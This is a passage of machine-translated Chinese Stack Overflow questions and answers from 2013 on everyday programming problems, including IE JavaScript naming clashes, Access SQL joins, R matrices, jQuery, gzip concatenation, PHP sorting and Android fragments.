> 
> 时间：2013-04-25T14:42:04.987

如果您有两个向量 a 和 b（a = (a1, a2, a3) 和 b = (b1, b2, b3)），则可以使用以下公式计算叉积：

axb = (a2*b3 - a3*b2, a3*b1 - a1*b3, a1*b2 - a2*b1)

# javascript - 脚本在 IE 中不起作用

> ID：16215325
> 
> 赞同：-1
> 
> 时间：2013-04-25T12:55:20.533
> 
> 标签：javascript, internet-explorer

这在除 IE 之外的所有其他浏览器中都可以正常工作。即使在 IE10 中它也不想合作。任何帮助，将不胜感激。我有一个带有下拉菜单的表单，当不同的用户进行选择时，它会显示一个具有不同表单的 div，我们有 10 个表单可供他们选择。现在它在 IE 中什么都不做，没有控制台错误或任何东西。

**脚本**

```
var sections = {
    'second': 'section2',
    'third': 'section3',
    'forth': 'section4',
    'fifth': 'section5',
    'sixth': 'section6',
    'seventh': 'section7',
    'eigth': 'section8',
    'ninth': 'section9',
    'tenth': 'section10',
    'eleventh': 'section11'
};

var selection = function (select)
{
    for (i in sections)
    document.getElementById(sections[i]).style.display = "none";
    document.getElementById(sections[select.value]).style.display = "block";
}
$("#target option")
    .removeAttr('selected')
    .find(':first')
    .attr('selected', 'selected'); 
```

的HTML

```
 <select id="forms" onchange="selection(this);">
    <option >Select an option</option>
     <option value="tenth">General Inquiry</option>
        <option value="second">Account Inquiry</option>
        <option value="third">ARC Request</option>
        <option value="forth">Contact Information Update</option>
        <option value="fifth">Contact your Board</option>
        <option value="sixth">Document Request</option>
        <option value="seventh">Maintenance Issue Reporting</option>
          <option value="eigth">Violations Reporting</option>
           <option value="ninth">Closing Statement</option>
            <option value="eleventh">Request for Proposal</option>

    </select> 
```

然后 11 个 div

```
 <div id="section10" style="display:none;">
 <h2>General Inquiry</h2>

</div> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T14:34:36.773

你的问题原来[`selection`是在 IE 中具有特殊含义](http://msdn.microsoft.com/en-us/library/ie/ms535869%28v=vs.85%29.aspx)。

对于您的代码，IE 会产生以下错误

```
SCRIPT5002: Function expected 
```

这说明了这个问题。

防止此问题的解决方法是更改​​您的函数名称，例如

```
var selectionFunc = function (select){...} 
```

在你的标记中，

```
<select id="forms" onchange="selectionFunc(this);">
....
</select> 
```

我希望它有帮助

# sql - 选择 Max Visual Studio 2010

> ID：16215326
> 
> 赞同：-1
> 
> 时间：2013-04-25T12:55:23.073
> 
> 标签：sql, vb.net, ms-access, vb6

我正在将一个程序从 Visual Basic 6 更新到 Visual Studio 2010，当然，我发现了很多问题，所以请解决。

我正在使用具有相同键（索引）的四个表的 Access 数据库。

如果我使用如下代码，我可以从 CodDekafix 表中获取最后一条记录：

```
Private Sub cmdLast_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles   cmdLast.Click
    Dim Con As New OleDbConnection("Provider=Microsoft.Jet.OLEDB.4.0;Data Source=C:\DEKAFIX\Consulta Dekafix\dekafix.mdb")
    Dim cmd As New OleDbCommand()
    Con.Open()
    sql = "Select * From Indice Where CodDekafix=(Select max(CodDekafix) From Indice)" 
```

但是，如果我想从具有相同键（索引）的所有表中获取所有结果，并进行如下所示的更改，则程序不起作用。

```
sql = "Select * from Indice, dekafix1, dekafix2, dekafix3" _
      & " where CodDekafix=(Select max(CodDekafix) From Indice) and" _
      & " Indice.CodDekafix = dekafix1.CodDekafix and" _
      & " dekafix1.CodDekafix=dekafix2.CodDekafix and" _
      & " dekafix2.CodDekafix=dekafix3.CodDekafix and" _
      & " ORDER BY Indice.CodDekafix" 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-25T13:30:15.337

您在第二个代码示例中的 SQL 代码无效。当我们在 VB 代码中去掉表示字符串的格式时，你会得到：

```
Select * from Indice, dekafix1, dekafix2, dekafix3
where CodDekafix=(Select max(CodDekafix) From Indice) and
Indice.CodDekafix = dekafix1.CodDekafix and
dekafix1.CodDekafix=dekafix2.CodDekafix and
dekafix2.CodDekafix=dekafix3.CodDekafix and
ORDER BY Indice.CodDekafix 
```

你在这里有两个问题：

1）在 ORDER BY 子句之前有一个额外的“和”。去掉它。

2) WHERE 子句的第一行有一个模棱两可的引用 `CodDekafix`——您需要指定来自哪个表。替换应该可以解决问题`CodDekafix`。`Indice.CodDekafix`

```
sql = "Select * from Indice, dekafix1, dekafix2, dekafix3" _
  & " where Indice.CodDekafix=(Select max(CodDekafix) From Indice) and" _
  & " Indice.CodDekafix = dekafix1.CodDekafix and" _
  & " dekafix1.CodDekafix=dekafix2.CodDekafix and" _
  & " dekafix2.CodDekafix=dekafix3.CodDekafix" _
  & " ORDER BY Indice.CodDekafix" 
```

# graph - 有向图中有多条路径？

> ID：16215327
> 
> 赞同：0
> 
> 时间：2013-04-25T12:55:24.230
> 
> 标签：graph, path, routes, dijkstra

我想开始为公共交通构建一个应用程序。我知道我应该使用 Dijkstra 作为算法来找到两点之间的最短路径。

我怎样才能获得多条路径？我想给用户至少 3 或 4 个选项，而不仅仅是最好的路线。原因是我想包含更多变量、时间、成本和巴士容量。

有没有什么算法可以帮助我做到这一点？或者我天真地认为我应该修改 Dijkstra 以给我不止一条路径。

干杯。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T13:03:20.693

看看[K 最短路径路由](http://en.wikipedia.org/wiki/K_shortest_path_routing)，dijkstra 的推广。

# r - R通过函数添加许多列

> ID：16215328
> 
> 赞同：1
> 
> 时间：2013-04-25T12:55:25.223
> 
> 标签：r

我试图通过下一个代码来减少层数：

```
X <- matrix(c(6,7,9,9,9,17,19,4,12,2,3,6,7,7),ncol=2)
layers <- c(5,10,15,20,25,30,35,40)
partitions <- function(u) {cbind(pmin(layers[1],u),t(diff(pmin(layers,u))))}
X <- cbind(X,lapply(X[,2], partitions)) 
```

该函数返回一个按层划分的整数。

> A = a1 + a2 + .... + a8

例子

```
A <- 19
partitions(A)
     [,1] [,2] [,3] [,4] [,5] [,6] [,7] [,8]
[1,]    5    5    5    4    0    0    0    0 
```

但结果没有我需要的矩阵。最终矩阵为 7 x (2 (X 中的列) + 8 (层数))

```
 [,1] [,2]      [,3]
[1,] 6    Numeric,8 NULL
[2,] 7    Numeric,8 NULL
[3,] 9    Numeric,8 NULL
[4,] 9    Numeric,8 NULL
[5,] 9    Numeric,8 NULL
[6,] 17   Numeric,8 NULL
[7,] 19   Numeric,8 NULL
> dim(X)
[1] 7 3 
```

我尝试了不同的形式并且曾经有尺寸错误。

问候

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T13:37:09.973

这两个之一应该是你想要的

```
> rbind(t(X),sapply(X[,2], partitions))
      [,1] [,2] [,3] [,4] [,5] [,6] [,7]
 [1,]    6    7    9    9    9   17   19
 [2,]    4   12    2    3    6    7    7
 [3,]    4    5    2    3    5    5    5
 [4,]    0    5    0    0    1    2    2
 [5,]    0    2    0    0    0    0    0
 [6,]    0    0    0    0    0    0    0
 [7,]    0    0    0    0    0    0    0
 [8,]    0    0    0    0    0    0    0
 [9,]    0    0    0    0    0    0    0
[10,]    0    0    0    0    0    0    0

> cbind(X,t(sapply(X[,2], partitions)))
     [,1] [,2] [,3] [,4] [,5] [,6] [,7] [,8] [,9] [,10]
[1,]    6    4    4    0    0    0    0    0    0     0
[2,]    7   12    5    5    2    0    0    0    0     0
[3,]    9    2    2    0    0    0    0    0    0     0
[4,]    9    3    3    0    0    0    0    0    0     0
[5,]    9    6    5    1    0    0    0    0    0     0
[6,]   17    7    5    2    0    0    0    0    0     0
[7,]   19    7    5    2    0    0    0    0    0     0 
```

# asp.net - ASP.NET - jquery ui 连接可排序保存到数据库

> ID：16215334
> 
> 赞同：1
> 
> 时间：2013-04-25T12:55:55.160
> 
> 标签：asp.net, jquery-ui

好的，所以我的页面上有一个可排序的 jQuery UI。一切正常。它们是从数据库动态创建的。所以我使用 ASP 中继器来填充 ul。这一切都很好。现在我需要将更新的列表保存到数据库中。事实证明这是非常困难的。

```
$(function () {
        $("#include, #exclude").sortable({
            connectWith: ".connectedSortable",
            dropOnEmpty: true,
        });
        $("#include, #exclude").disableSelection();
    }); 
```

这就是我为 jQuery 所拥有的。我认为这里可能需要更多，但我似乎无法弄清楚它是什么。我们找到了一种循环遍历中继器项并将它们放入 DataBoundLiteralControl 的方法，但每次它都使用旧顺序而不是新顺序。

对此的任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-06-11T13:26:22.980

```
 $("#sortable1 li").each(function (idx, li) {
          var idInputs = $(li).children(".id");
          var nameInputs = $(li).children(".name");//if an ItemName input is used
        $(idInputs).attr("id", "Items_" + idx + "__ItemId");
        $(idInputs).attr("name", "Items[" + idx + "].ItemId");
        //if an ItemName input is used
        $(nameInputs).attr("id", "Items_" + idx + "__ItemName");
        $(nameInputs).attr("name", "Items[" + idx + "].ItemName");
         }); 
```

看到这个链接： http: [//jgibson.com/ ?p=59](http://jgibson.com/?p=59)

# jquery - 检查输入字段值是否包含在数组中 - Jquery

> ID：16215338
> 
> 赞同：0
> 
> 时间：2013-04-25T12:56:09.010
> 
> 标签：jquery, arrays, input

如果输入字段的值等于数组中数字的值，我正在尝试触发函数。

我在下面有我的代码，但它似乎不起作用！

```
var num1 = $("#people-number").val();
var Numberarray = [1,3,5,7,9];

if ($.inArray(num1,Numberarray) > -1) {
     $("#valid-people").hide();
     $("#non-valid-people").fadeIn();   
} 
```

任何提示将不胜感激......

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T12:59:05.637

这是因为数组具有 int 值，而您正在测试的值是一个字符串

```
$.inArray(parseInt(num1),Numberarray) 
```

演示：[小提琴](http://jsfiddle.net/arunpjohny/PVPRh/1/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-25T12:59:12.853

您需要转换`num1`为数字。

```
if ($.inArray(+num1,Numberarray) > -1) 
```

或者

```
if ($.inArray(parseInt(num1, 10),Numberarray) > -1) 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-25T12:59:18.867

测试它：

```
var num1 = $("#people-number").val(); var Numberarray = [1,3,5,7,9];

if ($.inArray(parseInt(num1),Numberarray) > -1) {
    $("#valid-people").hide();
    $("#non-valid-people").fadeIn();   
} 
```

并返回任何结果。它在这里工作：http: [//jsfiddle.net/fjorgemota/q6WJA/](http://jsfiddle.net/fjorgemota/q6WJA/)

# three.js - 消除轨迹球控件中的无球滚动（带代码/修复）

> ID：16215342
> 
> 赞同：2
> 
> 时间：2013-04-25T12:56:20.183
> 
> 标签：three.js

TrackballControl 的意图是在轨迹球之外有一个“边界”来引发滚动吗？我个人不喜欢它。它有点不连续，并没有太多目的（恕我直言）。

如果没有，可以更改函数 getMouseProjectionOnBall，如下所示。这做了两件事（不一定“正确”）：

1.  标准化半径以填充两个轴
2.  映射球外的 z 值（即 z 之前为 0 的位置）

我个人觉得这更自然。

想法？

```
 this.getMouseProjectionOnBall = function(clientX, clientY)  {
    var xnormalized = (clientX - _this.screen.width * 0.5 - _this.screen.offsetLeft) / (_this.screen.width / 2.0);
    var ynormalized = (_this.screen.height * 0.5 + _this.screen.offsetTop - clientY) / (_this.screen.height / 2.0);
    var mouseOnBall = new THREE.Vector3(
        xnormalized,
        ynormalized,
        0.0
    );

    var length = mouseOnBall.length();

    var ballRadius = 1.0;  // As a fraction of the screen 
    if (length > ballRadius * 0.70710678118654752440) {
        var temp = ballRadius / 1.41421356237309504880;
        mouseOnBall.z = temp * temp / length;

        // Remove old method.
        // This Left z = 0, which meant rotation axis
        // becomes z, which is a roll
        //mouseOnBall.normalize();

    } else {
        mouseOnBall.z = Math.sqrt(1.0 - length * length);
    }

    _eye.copy(_this.object.position).sub(_this.target);

    var projection = _this.object.up.clone().setLength(mouseOnBall.y);
    projection.add(_this.object.up.clone().cross(_eye).setLength(mouseOnBall.x));
    projection.add(_eye.setLength(mouseOnBall.z));

    return projection;

}; 
```

# sql - 如何在 access 2003 中查询列数据类型？

> ID：16215343
> 
> 赞同：1
> 
> 时间：2013-04-25T12:56:20.490
> 
> 标签：sql, ms-access, lua, sqldatatypes, luasql

我正在寻找一种方法来获取列的数据类型，给定它所在的表和列的名称。我看到其他答案是指 MSysIMEXColumns 表，但我的 Access 数据库没有该表。如果有帮助，我正在使用 Access 2003。

我想将结果作为哈希表放入我的 LUA 代码中，以便在插入或查找之前，我可以查找列的数据类型。基本上这样我就可以确定字段是否需要引号。

LuaSQL 用于访问 access 数据库。

任何帮助或方向表示赞赏

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-25T14:42:02.550

[此处](http://www.keplerproject.org/luasql/manual.html#cursor_object)的 LuaSQL`cursor object`文档建议您应该能够使用

```
cur:getcoltypes() 
```

返回“列类型的列表（表）”。

# compression - 解压缩、编辑、压缩和连接文件

> ID：16215344
> 
> 赞同：0
> 
> 时间：2013-04-25T12:56:21.227
> 
> 标签：compression, gzip, concatenation, cat

我有一堆要连接的大型压缩文件。问题是，未压缩版本的末尾没有换行符，所以如果我尝试将它们放在一起并压缩它们，一个文件中的最后一行将连接到下一个文件中的第一行（这会引发我正在使用的软件错误）。只是在每个压缩文件之间插入一个换行符来处理它们是行不通的，因为我认为 gzip 检测到换行符并认为它是“尾随垃圾”之后的所有内容。例如

```
for f in *.gz; do (cat "${f}"; echo) >> all.gz; done;
gzip -d all.gz 

gzip: all.gz: decompression OK, trailing garbage ignored 
```

我想做的是这样的：

```
unzip file1.gz | add a newline char| gzip the output >> output.gz 
```

然后对 file2.gz、file3.gz 等执行相同的操作。

有什么建议么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-25T14:53:15.683

您不需要解压缩和重新压缩。只需使用 gzip 压缩一个字节的换行符，然后在您的大 gzip 文件之间连接它。

```
echo | gzip > newline.gz
cat file1.gz newline.gz file2.gz newline.gz file3.gz ... > file.gz 
```

这将是您为每个换行插入的 21 字节文件，但既然您说您的其他文件很大，那应该没关系。

# ruby-on-rails - 如何访问通过单击链接触发的 ajax 请求的响应？

> ID：16215347
> 
> 赞同：1
> 
> 时间：2013-04-25T12:56:26.127
> 
> 标签：ruby-on-rails, ajax, jquery

我有一个链接，点击它会触发一个 ajax POST 请求。我这样做：

```
$('a#create_object').click(); 
```

这会触发一个 ajax 请求。这个 ( `$.ajax({...})`) 的代码写在引导库的某个地方，我不想编辑 thwem。

ajax成功后如何访问请求的响应？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T13:02:09.047

自 jQuery 1.8.0 起，直接回调已被弃用，但您可以使用 .done、.fail 和 .always 回调！

如果你想做一些事情，你必须覆盖/访问回调，你不能从外部访问它，我的意思是！

```
$('#link').on('click', function(e) {
    $.ajax({
        type: "post",
        url: "your-page",
        data: {},
        dataType: "json"
    }).done(function (response) {
        alert('Success');
        console.log(response); // Use it here
    }).fail(function (response) {
        alert('Fail');
        console.log(response); // Use it here
    }).always(function (response) {
        // Here manage something every-time, when it's done OR failed.
    });
}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-25T13:01:16.150

```
$('#controlId').click(function(){ $.ajax({
        type: "POST",
        url: "PageUrl/Function",
        data: "{}",
        contentType: "application/json; charset=utf-8",
        dataType: "json",
        success: function (response) {
        alert(response.d); //here you can get the response on success of function
        }
    });
}); 
```

# php - 我可以用 1 个查询来做到这一点吗？

> ID：16215353
> 
> 赞同：0
> 
> 时间：2013-04-25T12:56:41.323
> 
> 标签：php, mysql

我正在用 php 中的类别创建一个简单的博客。

我希望 myblog.com/category.php?id=3 给我看这个：

```
TITLE of the category 3

// other stuff

ALL POSTS of the category 3 
```

所以，实际上我做了 2 个查询（1 个用于获取标题，1 个用于获取帖子）。

有没有办法用 1 个查询来做到这一点？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T13:06:00.733

根据你的数据库表，你可以这样

```
SELECT c.title, p.data FROM category c LEFT JOIN post p ON p.category = c.category ORDER BY p.date 
```

但是，每个帖子的类别标题都会重复

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-25T13:49:47.080

如果您需要这些表中的所有字段，那么我认为您应该使用@Damien 的方式。如果您只需要标题，您可以使用以下查询。在此查询中，第一行是 CATEGORY 的标题，下一行是帖子的标题。

```
select * from
(
select 0 as ordField, categoris.Category_TITLE as Title from categoris where id =3
union all
select 1 as ordField, POSTS.Post_TITLE as Title from POSTS where category_id=3
) t order by ordField 
```

# php - PHP - 基于数组中的“分组”值的备用行颜色

> ID：16215361
> 
> 赞同：1
> 
> 时间：2013-04-25T12:57:05.073
> 
> 标签：php

对此可能有一个简单的答案，但我只是无法理解它。

我有以下数组：

```
Array
(
    [0] => Array
        (
            [meeting_grouping] => 1
            [client_first_name] => Nikolay
        )

    [1] => Array
        (
            [meeting_grouping] => 1
            [client_first_name] => Konstantin
        )

    [2] => Array
        (
            [meeting_grouping] => 1
            [client_first_name] => Andrey
        )

    [3] => Array
        (
            [meeting_grouping] => 4
            [client_first_name] => Eddie
        )

    [4] => Array
        (
            [meeting_grouping] => 4
            [client_first_name] => Neil
        )

    [5] => Array
        (
            [meeting_grouping] => 6
            [client_first_name] => Ian
        )

    [6] => Array
        (
            [meeting_grouping] => 6
            [client_first_name] => Mark
        )
) 
```

我想做的是将这些数据输出到 HTML 表中并对行进行颜色编码。我知道如何交替行颜色，但在这种情况下，我需要根据 'meeting_grouping' 对其进行颜色编码。即 Nikolay、Konstantin 和 Andrey (meeting_grouping = 1) 将具有灰色背景，Eddie 和 Neil (meeting_grouping = 4) 将具有白色背景而 Ian 和 Mark (meeting_grouping = 6) 将再次具有灰色背景。

如果有人能指出我正确的方向，将不胜感激。

提前致谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-25T13:13:37.703

**如果您需要不同分组的任意样式**

将其输出到 HTML 表时，将具有分组编号的类名分配给行。然后你应该在 CSS 中为每个组定义样式，当然使用默认样式，以防出现一些新的分组。

例如，该表可能是：

```
<table>
    <tr class="meeting_grouping1">
        <td>Konstantin</td>
    </tr>
    <tr class="meeting_grouping1">
        <td>Andrey</td>
    </tr>
    <tr class="meeting_grouping4">
        <td>Eddie</td>
    </tr>
    <tr class="meeting_grouping4">
        <td>Neil</td>
    </tr>
    <tr class="meeting_grouping6">
        <td>Ivan</td>
    </tr>
    <tr class="meeting_grouping6">
        <td>Mark</td>
    </tr>
</table> 
```

然后在 CSS 中定义你的样式：

```
tr td
{
    background-color: white;
}

tr.metting_grouping1 td
{
    background-color: grey;
}

tr.metting_grouping4 td
{
    background-color: white;
}

tr.metting_grouping1 td
{
    background-color: grey;
} 
```

**如果您只需要为不同的分组交替颜色**

在遍历数组准备表格时，检查前一行的 meeting_grouping 值是否相同。如果不一样，请将样式切换为交替样式。在 PHP 中它可能看起来像这样：

```
$use_alternate_style = false;
$previous_grouping = false;

foreach ($meeting_groupings as $entry)
{
    if ($entry['meeting_grouping'] != $previous_grouping)
    {
        // Inverses the alternate style indicator
        $use_alternate_style = !$use_alternate_style;
    }

    // Stores the grouping number for the next cycle
    $previous_grouping = $entry['meeting_grouping'];

    // Depending on whether $use_alternate_style is true or not, you
    // add a class name to the table row and then assign background colors
    // similarly as in the above HTML/CSS example.
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-25T13:02:08.197

`meeting_grouping`您可以创建一个映射到相应颜色的数组，例如：

```
$colours = array(
  1 => 'grey',
  4 => 'white', 
  6 => 'grey'
); 
```

然后，当您仅迭代数组时`echo $colours[$meeting_grouping_var];`（`$meeting_grouping_var`当前`meeting_grouping`值在哪里）。

# php - 无法根据 2 个变量找出 usort 逻辑

> ID：16215363
> 
> 赞同：1
> 
> 时间：2013-04-25T12:57:05.967
> 
> 标签：php, usort

我有一组对象（目标），我想根据它们的 2 个属性（the`Status`和`DueDate`.

以下是规则：

状态：

1.  设计
2.  得到正式认可的
3.  进行中
4.  完全的
5.  存档

如果目标的状态为 4（已完成）或 5（已归档），则`DueDate`无关紧要。

如果一个目标既不是 4 也不是 5 并且它`DueDate`小于现在，那么它是“过期”并且应该在顶部

如果一个目标不是“过期”，那么状态的顺序决定了它的位置（从最低到最高）

如果`$a`和`$b`都是“过期”，那么最早的那个`DueDate`更重要

顺序应该是：

1.  逾期
2.  设计
3.  得到正式认可的
4.  进行中
5.  完全的
6.  存档

这是我尝试的最后一件事：

```
function cmp($a, $b)
{
    $now = new DateTime("now");
    $aDueDate = new DateTime($a->GetDueDate());
    $bDueDate = new DateTime($b->GetDueDate());

if($a->GetStatus() != 4 && $a->GetStatus() != 5 && $b->GetStatus() != 4 && $b->GetStatus() != 5){
    if($aDueDate < $now || $bDueDate < $now){
        if($aDueDate == $bDueDate){
        return 0;
    }

    return ($aDueDate < $bDueDate) ? -1 : 1;
    }
}
elseif(($a->GetStatus() == 4 || $a->GetStatus() == 5) && ($b->GetStatus() != 4 && $b->GetStatus() != 5)) {
    return -1;
}
elseif(($a->GetStatus() != 4 && $a->GetStatus() != 5) && ($b->GetStatus() == 4 || $b->GetStatus() == 5)){
    return 1;
}

if ($a->GetStatus() == $b->GetStatus()) {
        return 0;
    }
    return ($a->GetStatus() < $b->GetStatus()) ? -1 : 1;
} 
```

像这样对数组进行排序：

1.  完全的
2.  存档
3.  逾期
4.  设计
5.  得到正式认可的
6.  进行中

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T13:25:22.340

以下内容应满足您的要求：

```
function cmp($a, $b) {
    $now = new DateTime("now");
    $aDueDate = new DateTime($a->GetDueDate());
    $bDueDate = new DateTime($b->GetDueDate());
    $aStatus = $a->GetStatus();
    $bStatus = $b->GetStatus();
    $incompleteStatuses = array(1, 2, 3); 

    // use date if same status (might not be needed)    
    if ($aStatus == $bStatus) {
        return ($aDueDate < $bDueDate ? -1 : 1); 
    }   

    // if A is overdue:
    if (in_array($aStatus, $incompleteStatuses) && $aDueDate < $now) {
        // if B is overdue too, only consider dates
        if (in_array($bStatus, $incompleteStatuses) && $bDueDate < $now) {
            return ($aDueDate < $bDueDate ? -1 : 1); 
        }   

        return -1; // A definitely first
    }   
    // if B is overdue:
    elseif (in_array($bStatus, $incompleteStatuses) && $bDueDate < $now) {
        return 1; // B definitely first (we know A is not overdue from above)
    }   

    // both A and B are not overdue; order by status
    return $aStatus - $bStatus;
} 
```

[这是一个测试键盘](http://codepad.org/J6ri1Oy6)。

# android - Android Fragment 和重新加载应用程序

> ID：16215364
> 
> 赞同：3
> 
> 时间：2013-04-25T12:57:09.353
> 
> 标签：android, instance, fragment, reload

我有我的 FragmentActivity ：

```
public class FragmentActivity extends FragmentActivity
{
    // ...
    protected void onCreate(Bundle savedInstanceState) {
         if (savedInstanceState != null) {
             myFragment = (MyFragment) getSupportFragmentManager().getFragment(
            savedInstanceState, MyFragment.class.getName());
         }
         else {
             myFragment = new Fragment(myObject);
         }
    }
} 
```

在我的片段中：

```
public class MyFragment extends Fragment
{
    public MyFragment(myObject) {
        super();
        this.myObject = myObject;
        setRetainInstance(true);
    }

    @Override
    public View onCreateView(LayoutInflater inflater, ViewGroup container,
            Bundle savedInstanceState) {
        MyDAO myDAO = new MyDAO (myObject);
    }
} 
```

一切正常，除非我关闭我的应用程序，做一些事情（我的应用程序进入后台），然后重新启动我的应用程序。我得到一个 NullPointerException

```
MyDAO myDAO = new MyDAO (myObject); 
```

其中 myObject 为空。

调用了 savedInstanceState ......我不明白这是如何工作的。

泰

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-25T13:04:40.307

系统正在杀死您的进程，并且 myObject 的实例正在被垃圾收集。设置要保留的实例仅在方向更改之间有用，但请记住，当系统内存不足时，您在后台运行的应用程序可能会被终止。将此变量作为参数传递。在 MyDAO 类上实现 Parcelable 或 Serializable 很重要。

PS.：您的片段需要有一个空的构造函数，因为系统会在重新创建活动时重新创建其实例：

```
public MyFragment() {

}

public MyFragment(myObject) {
    super();
    setRetainInstance(true);
    Bundle args = new Bundle();
    args.putParcelable("myObject", myObject);
    setArguments(args);
}

@Override
public View onCreateView(LayoutInflater inflater, ViewGroup container,
        Bundle savedInstanceState) {
    myObject = getArguments().getParcelable("myObject");
    MyDAO myDAO = new MyDAO (myObject);
} 
```

# php - 使用 $_GET 进行分页 - 在 AJAX 中 - 是否可行

> ID：16215367
> 
> 赞同：0
> 
> 时间：2013-04-25T12:57:10.513
> 
> 标签：php, jquery, ajax

我正在使用 $_GET 开发一个用于分页的 PHP 类。它是标准的，从网上找到的。

在这里效果很好：page.php：

```
<form method ="GET">
<?php 
$pages = new Pagination();
echo "<br/>";
?>   
</form> 
```

我想在 index.php 中使用这个 page.php 和 ajax / jquery 并留在 index.php

```
<!DOCTYPE html>  
<body>
<div id ="result"></div>
<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.0/jquery.min.js"></script>   
<script>
$(document).ready(function() {
    $.post('./page.php', 
            function (data) {
                $('#result').html(data); 
            } 
    );  
});

</script>
</body>  
</html> 
```

这是可能的方式吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T12:59:57.223

是否有可能不使用 jquery 的 $.post，而是用 $.get 替换 $.post？

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-25T13:03:04.427

所以而不是`$.post`像你说的那样寻找`$_GET['page']`

所以你可以做这样的事情：

```
<script>
$(document).ready(function(e) {

    var page_num = 1;
    $('.nextpage').on('click',function(e){
        e.preventDefault(); // stop the link from going anywhere
        $.get('./page.php',
            {
                page: page_num // this is the same as $_GET['page']
            },
            function (data) {
                $('#result').html(data);
                page_num++;
            } 
        );  
    });

    $('.nextpage').click(); // emulate the click to get the first page 
});
</script> 
```

在你的身体里是这样的：

```
<a href="/page.php?page=2" class="nextpage">Next page</a> 
```

值得注意的是，在你`page.php`身上你不需要那个表格，因为我看不到它会做很多事情

**更新**

因此，要在`index.php`from上操作分页，`page.php`您可以`page.php`返回一个隐藏的 div`.hidden_pagination`及其全部内容。

```
<script>
$(document).ready(function(e) {

    $('.pagination').on('click','a',function(e){
        e.preventDefault(); // stop the link from going anywhere

        var next_page = $(this).attr('data-id'); // get the next page from the link data-id attribute
        $.get('./page.php',
            {
                page: next_page // this is the same as $_GET['page']
            },
            function (data) {
                $('#result').html(data);

                $('.pagination').html($('#result').children('.hidden_pagination').html()); // add the new pagination to the current pagination
            } 
        );  
    });

    $('.nextpage').click(); // emulate the click to get the first page 
});
</script>

<div class="pagination">
    <a href="#" class="nextpage" data-id="2">Next page</a>
</div>

<div id="result">
 this will be replaced with the ajax response
</div> 
```

# r - 使用列条目作为 R 中数据集的“选择器”

> ID：16215373
> 
> 赞同：0
> 
> 时间：2013-04-25T12:57:28.780
> 
> 标签：r

我的数组如下所示：

```
 Slide Index        A            B              C            DoseGroup
482    778     l        0            0              2       13Gy_p_75_42wk
483    778     r        0            0              2       13Gy_p_75_42wk
484    779     l        0            0              2       13Gy_p_75_42wk
485    779     r        0            0              2       13Gy_p_75_42wk
486   4700     l        2            2              2  14.25Gy_C_50pl_42wk
487   4700     r        0            0              1  14.25Gy_C_50pl_42wk 
488   4701     l        0            0              1  14.25Gy_C_50pl_42wk 
```

我想使用该`DoseGroup`列的条目来选择其他列中的相应条目。我希望能够告诉 R，例如，“`wilcox.test`在 the`13Gy_p_75_42wk`和`14.25Gy_C_50pl_42wk`使用 column 的数据集之间做一个`C`”。

**我怎么能用 R 做到这一点？**是否有某种方法可以选择所有具有条目的列`14.25Gy_C_50pl_42wk`？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T13:18:33.330

我修改了您的数据以在 DoseGroup 中添加第三个级别，以使其更真实。

```
txt <- "Slide Index        A            B              C            DoseGroup
  778     l        0            0              2       13Gy_p_75_42wk
  778     r        0            0              2       13Gy_p_75_42wk
  779     l        0            0              2       13Gy_p_75_42wk
  779     r        0            0              2       13Gy_p_75_42wk
 4700     l        2            2              2  14.25Gy_C_50pl_42wk
 4700     r        0            0              1  14.25Gy_C_50pl_42wk
 4701     l        0            0              1  14.25Gy_C_50pl_42wk
 4702     l        0            0              10  15Gy_C_50pl_42wk"

dat <- read.table(text = txt, header = TRUE)

wilcox.test(C ~ DoseGroup, data = dat, 
      subset = DoseGroup %in% c("13Gy_p_75_42wk", "14.25Gy_C_50pl_42wk"))

##  Wilcoxon rank sum test with continuity correction

## data:  C by DoseGroup
## W = 10, p-value = 0.1175
## alternative hypothesis: true location shift is not equal to 0 
```

要选择数据，您可以使用这两个命令之一。

```
dat[dat$DoseGroup == "14.25Gy_C_50pl_42wk", ]
subset(dat, DoseGroup == "14.25Gy_C_50pl_42wk") 
```

这些命令是基础`R`，如果您阅读任何介绍`R`，您将能够做到这一点。

所以我敦促你这样做，我想真正享受`R`。

# html - 使用 BootstrapCDN 更改配色方案

> ID：16215374
> 
> 赞同：5
> 
> 时间：2013-04-25T12:57:33.447
> 
> 标签：html, css, twitter-bootstrap, less

我正在使用 Bootstrap 构建一个网站，并通过 BootstrapCDN 获取文件。使用 BootstrapCDN 时修改配色方案的最佳方法是什么。我最好不要使用 CDN 吗？例如 - 我想更改链接的颜色。为此，我做到了`a{color:#000000}`——但想知道是否有更好的方法。谢谢！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-25T13:00:31.683

最简单的方法。使用引导 CDN 没有坏处。

```
<link href="bootstrap.min.css" rel="stylesheet">
<link href="bootstrap-responsive.min.css" rel="stylesheet">
<link href="css/custom-bootstrap-override.css" rel="stylesheet"> 
```

[如何将 twitter-bootstrap cdn 回退到本地副本](https://stackoverflow.com/questions/12575203/how-to-fallback-twitter-bootstrap-cdn-to-local-copy)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-25T13:09:09.053

